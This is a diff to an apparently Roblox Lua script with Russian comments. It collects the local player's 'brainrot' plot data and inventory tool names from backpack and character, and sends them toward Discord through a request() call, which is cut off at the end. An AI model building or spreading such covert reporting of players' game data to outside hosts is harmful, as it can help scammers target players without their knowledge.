@@ -48,31 +48,47 @@ local function collectBrainrots(plot)
     return brainrotsText
 end
 
--- === Сбор инвентаря и добавление к brainrots ===
-local function collectInventoryAndMerge(text)
+-- === Сбор инвентаря + Character ===
+local function collectInventory()
+    local invText = ""
+    local items = {}
+
+    -- Backpack
     local backpack = localPlayer:FindFirstChild("Backpack")
     if backpack then
-        text = text .. "\n--- Inventory ---\n"
-        local empty = true
         for _, item in ipairs(backpack:GetChildren()) do
             if item:IsA("Tool") then
-                text = text .. "- " .. item.Name .. "\n"
-                empty = false
+                table.insert(items, item.Name)
             end
         end
-        if empty then
-            text = text .. "⚠️ Инвентарь пуст\n"
-        end
-    else
-        text = text .. "\n⚠️ Backpack не найден\n"
     end
-    return text
+
+    -- Character
+    local character = localPlayer.Character
+    if character then
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") then
+                table.insert(items, item.Name)
+            end
+        end
+    end
+
+    if #items == 0 then
+        invText = "⚠️ Инвентарь пуст"
+    else
+        invText = "\n--- Inventory ---\n"
+        for _, name in ipairs(items) do
+            invText = invText .. "- " .. name .. "\n"
+        end
+    end
+
+    return invText
 end
 
 -- === Основной запуск ===
 local plot = findPlayerPlot()
 local brainrots = plot and collectBrainrots(plot) or "❌ Plot не найден"
-brainrots = collectInventoryAndMerge(brainrots)
+brainrots = brainrots .. collectInventory() -- объединяем Brainrots + Inventory
 
 -- === Отправка в Discord ===
 request({
